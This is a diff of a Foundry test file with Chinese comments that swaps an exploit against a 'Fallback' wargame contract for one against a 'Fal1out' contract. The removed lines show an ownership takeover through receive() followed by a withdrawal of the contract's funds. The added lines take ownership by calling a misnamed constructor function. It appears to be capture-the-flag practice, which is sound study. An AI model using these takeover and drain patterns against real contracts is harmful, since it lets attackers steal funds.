@@ -1,16 +1,16 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "../src/Fallback.sol";
+import "../src/Fal1out.sol";
 
-contract FallbackAttackTest is Test {
-    Fallback public target;
+contract Fal1outAttackTest is Test {
+    Falllout public target;
     address public attacker = makeAddr("attacker");
 
     function setUp() public {
         // 部署合约，模拟真实环境
-        target = new Fallback();
+        target = new Falllout();
         // 给攻击者一点ETH
         vm.deal(attacker, 1 ether);
     }
@@ -22,25 +22,14 @@ contract FallbackAttackTest is Test {
         // 确认攻击前 owner 不是我们
         assertNotEq(target.owner(), attacker, "attack not started yet");
 
-        // 第一步：捐款建立 contributions 记录
-        target.contribute{value: 0.0001 ether}();
-        assertGt(target.contributions(attacker), 0, "contribution failed");
+        // 第一步：来touch“Fal1out”
+        target.Fal1out();
 
-        // 第二步：直接转ETH触发 receive()，夺取owner
-        (bool success,) = address(target).call{value: 0.0001 ether}("");
-        require(success, "transfer failed");
-
-        // 确认已经夺取 owner
+        // 确认已经夺舍 owner
         assertEq(target.owner(), attacker, "owner takeover failed");
-
-        // 第三步：提走合约里所有ETH
-        uint256 balanceBefore = attacker.balance;
-        target.withdraw();
-        assertGt(attacker.balance, balanceBefore, "withdraw failed");
 
         vm.stopPrank();
 
         console.log("Attack successful!");
-        console.log("Attacker balance after:", attacker.balance);
     }
 }
